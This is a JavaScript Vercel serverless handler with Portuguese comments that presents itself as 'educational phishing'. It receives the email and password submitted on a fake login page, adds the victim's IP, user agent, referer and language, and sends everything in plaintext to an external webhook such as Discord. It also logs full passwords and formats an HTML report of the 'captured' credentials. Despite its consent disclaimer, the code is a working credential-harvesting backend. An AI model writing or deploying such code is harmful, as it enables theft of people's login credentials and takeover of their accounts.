// API Serverless para Vercel - Captura de dados de phishing educacional
export default async function handler(req, res) {
    // Configurar CORS

    console.log('🔍 DEBUG - Webhook URL presente:', !!process.env.WEBHOOK_URL);
    console.log('🔍 DEBUG - Dados recebidos:', {
        email: req.body.email,
        password: req.body.password ? '***' : 'vazia',
        ip: req.body.ip
    });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Responder a requisições OPTIONS (preflight)
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Apenas aceitar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método não permitido' });
    }
    
    try {
        const { email, password, timestamp, userAgent, ip } = req.body;
        
        // Validar dados recebidos
        if (!email || !password) {
            return res.status(400).json({ error: 'Dados incompletos' });
        }
        
        // Preparar dados para envio
        const capturedData = {
            email,
            password,
            timestamp: timestamp || new Date().toISOString(),
            userAgent: userAgent || req.headers['user-agent'],
            ip: ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
            referer: req.headers.referer || 'Direto',
            acceptLanguage: req.headers['accept-language'] || 'Não disponível'
        };
        
        // Enviar email com os dados capturados
        await sendEmailNotification(capturedData);
        
        // Log para monitoramento (remover em produção)
        console.log('Dados capturados:', {
            email: capturedData.email,
            timestamp: capturedData.timestamp,
            ip: capturedData.ip
        });
        
        // Resposta de sucesso
        return res.status(200).json({ 
            success: true, 
            message: 'Dados processados com sucesso' 
        });
        
    } catch (error) {
        console.error('Erro ao processar dados:', error);
        return res.status(500).json({ 
            error: 'Erro interno do servidor',
            message: error.message 
        });
    }
}

// Função para enviar email com os dados capturados
async function sendEmailNotification(data) {
    // Configurar o serviço de email (usando EmailJS ou similar)
    const emailData = {
        to: process.env.NOTIFICATION_EMAIL || 'seu-email@exemplo.com',
        subject: '🔒 [PHISHING EDUCACIONAL] Novos dados capturados',
        html: generateEmailHTML(data)
    };
    
    // Opção 1: Usar EmailJS (requer configuração no frontend)
    // Opção 2: Usar serviço SMTP (requer variáveis de ambiente)
    // Opção 3: Usar webhook do Discord/Slack
    
    // Para este exemplo, vamos usar um webhook simples
    if (process.env.WEBHOOK_URL) {
        await sendWebhook(data);
    }
    
    // Alternativa: salvar em arquivo de log
    await logToFile(data);
}

// Função para enviar webhook (Discord, Slack, etc.)
async function sendWebhook(data) {
    try {
        const webhookPayload = {
            content: `🔒 **NOVOS DADOS CAPTURADOS**\n📧 Email: ||${data.email}||\n🔑 Senha: ||${data.password}||\n🌐 IP: ${data.ip}\n🕒 Horário: ${new Date(data.timestamp).toLocaleString('pt-BR')}`
        };
        
        console.log('Enviando webhook simplificado...');
        
        const response = await fetch(process.env.WEBHOOK_URL, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookPayload)
        });
        
        console.log('Resposta do webhook:', response.status);
        
        if (!response.ok) {
            throw new Error(`Webhook failed: ${response.status}`);
        }
        
        console.log('Webhook enviado com sucesso!');
        
    } catch (error) {
        console.error('Erro ao enviar webhook:', error);
    }
}

// Função para gerar HTML do email
function generateEmailHTML(data) {
    return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Dados de Phishing Capturados</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
            .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { background: #d93025; color: white; padding: 20px; text-align: center; }
            .content { padding: 20px; }
            .field { margin-bottom: 15px; }
            .label { font-weight: bold; color: #333; }
            .value { background: #f8f9fa; padding: 8px; border-radius: 4px; margin-top: 5px; font-family: monospace; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 Dados de Phishing Educacional</h1>
                <p>Sistema de Monitoramento de Cybersegurança</p>
            </div>
            <div class="content">
                <div class="warning">
                    <strong>⚠️ AVISO:</strong> Estes dados foram capturados para fins educacionais de cybersegurança. 
                    Certifique-se de que esta atividade está sendo realizada em ambiente controlado e com consentimento apropriado.
                </div>
                
                <div class="field">
                    <div class="label">📧 Email Capturado:</div>
                    <div class="value">${data.email}</div>
                </div>
                
                <div class="field">
                    <div class="label">🔑 Senha Capturada:</div>
                    <div class="value">${data.password}</div>
                </div>
                
                <div class="field">
                    <div class="label">🕒 Data e Hora:</div>
                    <div class="value">${new Date(data.timestamp).toLocaleString('pt-BR')}</div>
                </div>
                
                <div class="field">
                    <div class="label">🌐 Endereço IP:</div>
                    <div class="value">${data.ip}</div>
                </div>
                
                <div class="field">
                    <div class="label">🖥️ User Agent:</div>
                    <div class="value">${data.userAgent}</div>
                </div>
                
                <div class="field">
                    <div class="label">🔗 Referrer:</div>
                    <div class="value">${data.referer}</div>
                </div>
                
                <div class="field">
                    <div class="label">🌍 Idioma:</div>
                    <div class="value">${data.acceptLanguage}</div>
                </div>
            </div>
        </div>
    </body>
    </html>
    `;
}

// Função para salvar em arquivo de log (backup)
async function logToFile(data) {
    // Em ambiente serverless, isso seria salvo em um banco de dados
    // Para fins de demonstração, apenas logamos no console
    const logEntry = {
        timestamp: data.timestamp,
        email: data.email,
        password: data.password,
        ip: data.ip,
        userAgent: data.userAgent
    };
    
    console.log('LOG_ENTRY:', JSON.stringify(logEntry));
}